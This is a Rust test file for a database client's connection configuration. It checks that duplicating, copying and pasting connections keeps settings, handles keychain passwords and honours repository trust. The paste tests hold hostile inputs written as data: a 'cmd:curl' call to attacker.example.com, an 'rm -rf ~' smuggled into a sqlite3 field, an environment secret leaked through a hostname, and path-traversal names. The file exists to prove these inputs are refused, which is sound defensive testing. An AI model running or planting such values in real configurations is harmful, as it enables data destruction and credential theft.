//! Duplicating, copying and pasting connections (ADR-030), with temporary directories and a
//! fake secret backend (the real keychain is never touched).

mod common;

use std::path::PathBuf;

use common::{BASTION, FakeBackend, Fixture, personal, team};
use spelaion_config::{
    Engine, ResolveError, TlsModeConfig, TrustStore, connection_account, connection_clipboard_text,
    duplicate_connection, paste_connection,
};

const FULL: &str = r#"#:schema https://spelaion.dev/schema/db/connection.schema.json

# Orders, as the team uses it.
schema_version = 1
name = "Orders" # shown in the explorer
engine = "postgres"
env = "prod"
host = "orders.internal"
port = 5433
database = "orders"
user = "app"
password = { secret = "keychain" }
tunnel = "bastion"
local_port = 15433
read_only = true
keepalive = 120

[tls]
mode = "verify-full"
ca = "certs/ca.pem"

[mcp]
exposed = true
max_rows = 500
writes = "confirm"
"#;

#[test]
fn duplicating_keeps_every_setting_and_comment_under_a_new_name() {
    let fx = Fixture::new("dup-personal");
    fx.write("user/tunnels/bastion.toml", BASTION);
    fx.write("user/connections/prod/orders.toml", FULL);
    let config = fx.config();
    let backend = FakeBackend::default();
    let mut trust = fx.untrusted();

    let copy =
        duplicate_connection(&config, &mut trust, &personal("prod/orders"), &backend).unwrap();
    assert_eq!(copy.id, personal("prod/orders-copy"));
    assert_eq!(copy.name, "Orders (copy)");
    let text = fx.read("user/connections/prod/orders-copy.toml");
    // Only the name differs: comments, order, and keys the form does not show stay.
    assert_eq!(
        text,
        FULL.replace(r#"name = "Orders""#, r#"name = "Orders (copy)""#)
    );
    let original = config.connection(&personal("prod/orders")).unwrap();
    let mut expected = original.file.clone();
    expected.name = Some("Orders (copy)".into());
    assert_eq!(copy.file, expected);

    // Unique names: the next copies count up, and a copy of a copy says so.
    let config = fx.config();
    let second =
        duplicate_connection(&config, &mut trust, &personal("prod/orders"), &backend).unwrap();
    assert_eq!(second.id, personal("prod/orders-copy-2"));
    assert_eq!(second.name, "Orders (copy 2)");
    // A file that exists but does not load (or is not listed yet) is never replaced.
    fx.write("user/connections/prod/orders-copy-3.toml", "broken");
    let config = fx.config();
    let fourth =
        duplicate_connection(&config, &mut trust, &personal("prod/orders"), &backend).unwrap();
    assert_eq!(fourth.id, personal("prod/orders-copy-4"));
    assert_eq!(
        fx.read("user/connections/prod/orders-copy-3.toml"),
        "broken"
    );
    let config = fx.config();
    let nested =
        duplicate_connection(&config, &mut trust, &personal("prod/orders-copy"), &backend).unwrap();
    assert_eq!(nested.id, personal("prod/orders-copy-copy"));
    assert_eq!(nested.name, "Orders (copy) (copy)");
    let config = fx.config();
    assert_eq!(
        config.problems.len(),
        1,
        "only the broken file fails to load"
    );
    assert!(
        config
            .connections
            .iter()
            .filter(|c| c.id.path.starts_with("prod/orders"))
            .count()
            == 5
    );
}

#[test]
fn duplicating_copies_the_keychain_password_inside_the_core() {
    let fx = Fixture::new("dup-secret");
    fx.write(
        "user/connections/db.toml",
        "schema_version = 1\nengine = \"mysql\"\nhost = \"h\"\nuser = \"u\"\npassword = { secret = \"keychain\" }\n",
    );
    fx.write(
        "user/connections/named.toml",
        "schema_version = 1\nengine = \"mysql\"\nhost = \"h\"\nuser = \"u\"\npassword = { secret = \"keychain:shared\" }\n",
    );
    let config = fx.config();
    let backend = FakeBackend::default();
    let original = connection_account(&config, &personal("db"));
    backend
        .keychain
        .lock()
        .unwrap()
        .insert(original.clone(), "s3cret".into());
    // An entry left behind by an older connection of the copy's name.
    let stale = connection_account(&config, &personal("db-copy-2"));
    backend
        .keychain
        .lock()
        .unwrap()
        .insert(stale.clone(), "old".into());
    let mut trust = fx.untrusted();

    let copy = duplicate_connection(&config, &mut trust, &personal("db"), &backend).unwrap();
    assert!(copy.password_copied);
    let keychain = backend.keychain.lock().unwrap().clone();
    assert_eq!(keychain[&connection_account(&config, &copy.id)], "s3cret");
    assert_eq!(keychain[&original], "s3cret", "the original keeps its own");
    assert_eq!(copy.file.name.as_deref(), Some("db (copy)"));

    // Without a stored password the copy asks, and never inherits a stale entry.
    backend.keychain.lock().unwrap().remove(&original);
    let config = fx.config();
    let copy = duplicate_connection(&config, &mut trust, &personal("db"), &backend).unwrap();
    assert_eq!(copy.id, personal("db-copy-2"));
    assert!(!copy.password_copied);
    assert!(!backend.keychain.lock().unwrap().contains_key(&stale));

    // A named entry is shared on purpose: the copy names the same one, nothing is copied.
    let reads = backend.reads.lock().unwrap().len();
    let named = duplicate_connection(&config, &mut trust, &personal("named"), &backend).unwrap();
    assert!(!named.password_copied);
    assert_eq!(backend.reads.lock().unwrap().len(), reads);
    assert_eq!(named.file.password.unwrap().secret, "keychain:shared");

    // A keychain that refuses the copy leaves no file behind.
    backend
        .keychain
        .lock()
        .unwrap()
        .insert(original.clone(), "s3cret".into());
    let failing = FakeBackend {
        fail_set: true,
        ..FakeBackend::default()
    };
    failing
        .keychain
        .lock()
        .unwrap()
        .insert(original, "s3cret".into());
    let config = fx.config();
    let err = duplicate_connection(&config, &mut trust, &personal("db"), &failing).unwrap_err();
    assert!(matches!(err, ResolveError::Secret { .. }), "{err}");
    assert!(!fx.user().join("connections/db-copy-3.toml").exists());
    assert!(!err.to_string().contains("s3cret"));

    // A locked keychain is an error too, and nothing is created.
    let locked = FakeBackend {
        fail_get: true,
        ..FakeBackend::default()
    };
    let err = duplicate_connection(&config, &mut trust, &personal("db"), &locked).unwrap_err();
    assert!(matches!(err, ResolveError::Secret { .. }), "{err}");
    assert!(!fx.user().join("connections/db-copy-3.toml").exists());

    // Without a system keychain there is nothing to copy: the copy asks, like the original.
    let none = FakeBackend {
        no_keychain: true,
        ..FakeBackend::default()
    };
    let copy = duplicate_connection(&config, &mut trust, &personal("db"), &none).unwrap();
    assert_eq!(copy.id, personal("db-copy-3"));
    assert!(!copy.password_copied);
}

#[test]
fn team_copies_need_the_original_as_trusted_and_are_pinned() {
    let fx = Fixture::new("dup-team");
    fx.write("repo/.spelaion/tunnels/bastion.toml", BASTION);
    fx.write("repo/.spelaion/connections/eu/orders.toml", FULL);
    let backend = FakeBackend::default();

    // Untrusted repository: nothing is copied.
    let mut trust = fx.untrusted();
    let err =
        duplicate_connection(&fx.config(), &mut trust, &team("eu/orders"), &backend).unwrap_err();
    assert!(matches!(err, ResolveError::Untrusted { .. }), "{err}");
    let err =
        connection_clipboard_text(&fx.config(), &trust, &team("eu/orders"), &backend).unwrap_err();
    assert!(matches!(err, ResolveError::Untrusted { .. }), "{err}");
    assert!(
        !fx.repo()
            .join(".spelaion/connections/eu/orders-copy.toml")
            .exists()
    );

    // Trusted: the copy goes next to the original, in the repository, and is usable at once.
    let mut trust = fx.trusted();
    let copy =
        duplicate_connection(&fx.config(), &mut trust, &team("eu/orders"), &backend).unwrap();
    assert_eq!(copy.id, team("eu/orders-copy"));
    assert!(
        fx.repo()
            .join(".spelaion/connections/eu/orders-copy.toml")
            .exists()
    );
    let reloaded = TrustStore::load(&fx.user()).unwrap();
    assert!(
        reloaded.changes(&fx.config()).is_empty(),
        "the copy is pinned as written"
    );

    // A pull that changes the original: it must be reviewed before it can be copied.
    let changed = FULL.replace("orders.internal", "attacker.example.com");
    fx.write("repo/.spelaion/connections/eu/orders.toml", &changed);
    let mut trust = TrustStore::load(&fx.user()).unwrap();
    let err =
        duplicate_connection(&fx.config(), &mut trust, &team("eu/orders"), &backend).unwrap_err();
    assert!(matches!(err, ResolveError::Changed { .. }), "{err}");
    let err =
        connection_clipboard_text(&fx.config(), &trust, &team("eu/orders"), &backend).unwrap_err();
    assert!(matches!(err, ResolveError::Changed { .. }), "{err}");
    assert!(
        !fx.repo()
            .join(".spelaion/connections/eu/orders-copy-2.toml")
            .exists()
    );

    // A new, never reviewed connection is not copied either.
    fx.write(
        "repo/.spelaion/connections/new.toml",
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"x.db\"\n",
    );
    let err = duplicate_connection(&fx.config(), &mut trust, &team("new"), &backend).unwrap_err();
    assert!(matches!(err, ResolveError::Changed { .. }), "{err}");
    // And the repository's copy that someone edits by hand stops being trusted, as any file.
    let copy_path = fx.repo().join(".spelaion/connections/eu/orders-copy.toml");
    let text = std::fs::read_to_string(&copy_path).unwrap();
    std::fs::write(&copy_path, text.replace("orders.internal", "elsewhere")).unwrap();
    assert_eq!(
        TrustStore::load(&fx.user())
            .unwrap()
            .changes(&fx.config())
            .len(),
        3
    );
}

#[test]
fn copied_text_has_no_secrets_and_pastes_back_as_a_personal_connection() {
    let fx = Fixture::new("clipboard");
    fx.write("repo/.spelaion/tunnels/bastion.toml", BASTION);
    fx.write("repo/.spelaion/connections/eu/orders.toml", FULL);
    fx.write(
        "repo/.spelaion/connections/shop.toml",
        "schema_version = 1\nname = \"Shop\"\nengine = \"sqlite\"\ndatabase = \"data/shop.db\"\n",
    );
    let backend = FakeBackend::default();
    let trust = fx.trusted();
    let config = fx.config();
    backend.keychain.lock().unwrap().insert(
        connection_account(&config, &team("eu/orders")),
        "s3cret".into(),
    );

    let copied = connection_clipboard_text(&config, &trust, &team("eu/orders"), &backend).unwrap();
    assert!(copied.text.starts_with("# A SpelaionDB connection"));
    assert!(
        copied.text.contains(r#"secret = "prompt""#),
        "{}",
        copied.text
    );
    assert!(!copied.text.contains("keychain") && !copied.text.contains("s3cret"));
    assert!(!copied.text.contains("[mcp]") && !copied.text.contains("writes"));
    assert_eq!(copied.left_out, ["password", "mcp"]);
    assert!(
        backend.reads.lock().unwrap().is_empty(),
        "copying reads no secret"
    );
    // Repository paths become absolute so the text means the same anywhere.
    let ca = fx
        .repo()
        .join("certs/ca.pem")
        .to_string_lossy()
        .into_owned();
    assert!(copied.text.contains(&ca), "{}", copied.text);
    let shop = connection_clipboard_text(&config, &trust, &team("shop"), &backend).unwrap();
    assert!(shop.left_out.is_empty());

    // Pasted: personal, a fresh name if taken, the password asked, no tunnel of that name.
    let pasted = paste_connection(&config, &copied.text, &backend).unwrap();
    assert_eq!(pasted.id, personal("orders"));
    assert_eq!(pasted.name, "Orders");
    assert!(pasted.left_out.is_empty(), "the copy already left them out");
    let config = fx.config();
    let entry = config.connection(&pasted.id).unwrap();
    let original = config.connection(&team("eu/orders")).unwrap();
    assert_eq!(entry.file.password.as_ref().unwrap().secret, "prompt");
    assert_eq!(entry.file.host, original.file.host);
    assert_eq!(entry.file.port, original.file.port);
    assert_eq!(
        entry.file.tunnel.as_deref(),
        Some("bastion"),
        "found in the repository"
    );
    assert_eq!(entry.file.local_port, Some(15433));
    assert_eq!(entry.file.tls.mode, TlsModeConfig::VerifyFull);
    assert!(entry.file.read_only);
    assert_eq!(entry.file.keepalive, Some(120));
    assert!(!entry.file.mcp.exposed);
    assert!(!fx.repo().join(".spelaion/connections/orders.toml").exists());

    let again = paste_connection(&config, &copied.text, &backend).unwrap();
    assert_eq!(
        (again.id, again.name.as_str()),
        (personal("orders-copy"), "Orders (copy)")
    );
    let config = fx.config();
    let third = paste_connection(&config, &copied.text, &backend).unwrap();
    assert_eq!(third.name, "Orders (copy 2)");

    // No tunnel of that name on this computer: left out.
    let other = Fixture::new("clipboard-elsewhere");
    let pasted = paste_connection(&other.config(), &copied.text, &backend).unwrap();
    assert_eq!(pasted.left_out, ["tunnel"]);
    let file = other.config().connection(&pasted.id).unwrap().file.clone();
    assert_eq!((file.tunnel, file.local_port), (None, None));

    // The SQLite file keeps pointing at the repository's file.
    let pasted = paste_connection(&other.config(), &shop.text, &backend).unwrap();
    let file = other.config().connection(&pasted.id).unwrap().file.clone();
    assert_eq!(
        PathBuf::from(file.database.unwrap()),
        fx.repo().join("data/shop.db")
    );
    assert!(backend.runs.lock().unwrap().is_empty());
    assert!(
        backend.keychain.lock().unwrap().len() == 1,
        "nothing written to the keychain"
    );
}

#[test]
fn pasted_text_cannot_create_what_the_form_could_not_or_read_secrets() {
    let fx = Fixture::new("paste-malicious");
    let backend = FakeBackend::default();
    let config = fx.config();
    let paste = |text: &str| paste_connection(&config, text, &backend);

    // Secrets from anywhere become a password asked when connecting; no command survives.
    let pasted = paste(
        "schema_version = 1\nname = \"Prod\"\nengine = \"postgres\"\nhost = \"attacker.example.com\"\n\
         database = \"d\"\nuser = \"u\"\npassword = { secret = \"cmd:curl https://attacker.example.com\" }\n\
         [kubernetes]\nresource = \"svc/db\"\nkubeconfig = \"evil.yaml\"\nkubectl = \"C:/evil.exe\"\n\
         [mcp]\nexposed = true\nwrites = \"allow\"\n",
    )
    .unwrap();
    assert_eq!(
        pasted.left_out,
        [
            "password",
            "kubernetes.kubeconfig",
            "kubernetes.kubectl",
            "mcp"
        ]
    );
    let config2 = fx.config();
    let file = &config2.connection(&pasted.id).unwrap().file;
    assert_eq!(file.password.as_ref().unwrap().secret, "prompt");
    let kubernetes = file.kubernetes.as_ref().unwrap();
    assert_eq!(
        (kubernetes.kubeconfig.clone(), kubernetes.kubectl.clone()),
        (None, None)
    );
    assert_eq!(file.mcp, Default::default());
    for secret in [
        "env:AWS_SECRET_ACCESS_KEY",
        "op://vault/item/password",
        "keychain:other",
        "keychain",
    ] {
        let text = format!(
            "schema_version = 1\nname = \"{secret}\"\nengine = \"mysql\"\nhost = \"h\"\nuser = \"u\"\npassword = {{ secret = \"{secret}\" }}\n"
        );
        let pasted = paste(&text).unwrap();
        let config = fx.config();
        assert_eq!(
            config
                .connection(&pasted.id)
                .unwrap()
                .file
                .password
                .as_ref()
                .unwrap()
                .secret,
            "prompt"
        );
    }
    // SQLite on a server: the program run there is left out.
    let pasted = paste(
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"/srv/a.db\"\nsqlite3 = \"rm -rf ~; sqlite3\"\n",
    )
    .unwrap();
    assert_eq!(pasted.left_out, ["sqlite3"]);
    assert_eq!(pasted.name, "Pasted connection");

    // Environment variables would reach the server (or DNS): refused anywhere.
    for text in [
        "schema_version = 1\nengine = \"mysql\"\nhost = \"${env:AWS_SECRET_ACCESS_KEY}.attacker.com\"\nuser = \"u\"\n",
        "schema_version = 1\nengine = \"mysql\"\nhost = \"h\"\nuser = \"${env:USER}\"\n",
        "schema_version = 1\nengine = \"postgres\"\nhost = \"h\"\nuser = \"u\"\ndatabase = \"d\"\n[tls]\nca = \"${env:HOME}/ca.pem\"\n",
        "schema_version = 1\nengine = \"mysql\"\nhost = \"h\"\nuser = \"u\"\nname = \"${nope}\"\n",
    ] {
        let err = paste(text).unwrap_err().to_string();
        assert!(err.contains("cannot use ${"), "{err}");
    }
    // `${user.…}` is the user's own value, as in a team file.
    let pasted = paste(
        "schema_version = 1\nname = \"Mine\"\nengine = \"mysql\"\nhost = \"h\"\nuser = \"${user.db_user}\"\n",
    )
    .unwrap();
    assert_eq!(pasted.name, "Mine");

    // What the form refuses, a paste refuses too; nothing is written.
    let before = std::fs::read_dir(fx.user().join("connections"))
        .unwrap()
        .count();
    for (text, expected) in [
        ("hello", "does not hold a connection"),
        ("", "does not hold a connection"),
        (
            "schema_version = 1\nengine = \"oracle\"\nhost = \"h\"\n",
            "valid connection",
        ),
        (
            "schema_version = 1\nengine = \"mysql\"\nhost = \"h\"\nuser = \"u\"\nevil = true\n",
            "valid connection",
        ),
        (
            "schema_version = 1\nengine = \"mysql\"\nhost = \"h\"\nuser = \"u\"\npassword = \"plain\"\n",
            "valid connection",
        ),
        (
            "schema_version = 2\nengine = \"mysql\"\nhost = \"h\"\nuser = \"u\"\n",
            "version 2",
        ),
        (
            "schema_version = 1\nengine = \"postgres\"\nhost = \"h\"\nuser = \"u\"\n",
            "missing",
        ),
        (
            "schema_version = 1\nengine = \"mysql\"\nhost = \"h\"\nuser = \"u\"\n[kubernetes]\nresource = \"secret/x\"\n",
            "resource",
        ),
        (
            "schema_version = 1\nengine = \"sqlserver\"\nhost = \"h\"\nuser = \"u\"\n[tls]\ncert = \"c.pem\"\nkey = \"k.pem\"\n",
            "client certificate",
        ),
        (
            "schema_version = 1\nname = \"../../escape\"\nengine = \"sqlite\"\ndatabase = \"a.db\"\n[[x]]\n",
            "valid connection",
        ),
    ] {
        let err = paste(text).unwrap_err().to_string();
        assert!(err.contains(expected), "{text:?}: {err}");
    }
    let huge = format!(
        "schema_version = 1\nengine = \"sqlite\"\ndatabase = \"a.db\"\nname = \"{}\"\n",
        "x".repeat(spelaion_config::MAX_CLIPBOARD_TEXT)
    );
    assert!(paste(&huge).unwrap_err().to_string().contains("too long"));
    assert_eq!(
        std::fs::read_dir(fx.user().join("connections"))
            .unwrap()
            .count(),
        before
    );

    // Settings a local file has no use for are not written, as the form does.
    let pasted = paste(
        "schema_version = 1\nname = \"Local\"\nengine = \"duckdb\"\ndatabase = \"a.duckdb\"\nhost = \"h\"\n\
         [kubernetes]\nresource = \"svc/x\"\n[tls]\nmode = \"require\"\n",
    )
    .unwrap();
    let config2 = fx.config();
    let file = &config2.connection(&pasted.id).unwrap().file;
    assert!(file.kubernetes.is_none() && file.host.is_none());
    assert_eq!(file.tls, Default::default());

    // A name cannot pick the file: it is only ever a slug in the personal folder.
    let pasted = paste(
        "schema_version = 1\nname = \"../../../evil\"\nengine = \"sqlite\"\ndatabase = \"a.db\"\n",
    )
    .unwrap();
    assert_eq!(pasted.id, personal("evil"));
    assert!(fx.user().join("connections/evil.toml").exists());
    assert!(backend.runs.lock().unwrap().is_empty());
    assert!(backend.reads.lock().unwrap().is_empty());
    assert!(backend.keychain.lock().unwrap().is_empty());
}

#[test]
fn connection_urls_paste_without_their_password() {
    let fx = Fixture::new("paste-url");
    let backend = FakeBackend::default();
    let pasted = paste_connection(
        &fx.config(),
        "  postgres://reader:s3cret@db.example.com:5433/sales?sslmode=verify-full  ",
        &backend,
    )
    .unwrap();
    assert_eq!(pasted.name, "sales");
    let config = fx.config();
    let file = &config.connection(&pasted.id).unwrap().file;
    assert_eq!(file.engine, Engine::Postgres);
    assert_eq!(file.host.as_deref(), Some("db.example.com"));
    assert_eq!(file.port, Some(5433));
    assert_eq!(file.user.as_deref(), Some("reader"));
    assert_eq!(file.password.as_ref().unwrap().secret, "prompt");
    assert_eq!(file.tls.mode, TlsModeConfig::VerifyFull);
    let text = std::fs::read_to_string(&config.connection(&pasted.id).unwrap().file_path).unwrap();
    assert!(!text.contains("s3cret"));
    assert!(backend.keychain.lock().unwrap().is_empty());

    let pasted = paste_connection(&config, "mysql://root@localhost", &backend).unwrap();
    assert_eq!(pasted.name, "localhost");
    let pasted = paste_connection(&fx.config(), "sqlite:C:/data/shop.v2.sqlite", &backend).unwrap();
    assert_eq!(pasted.name, "shop.v2");
}
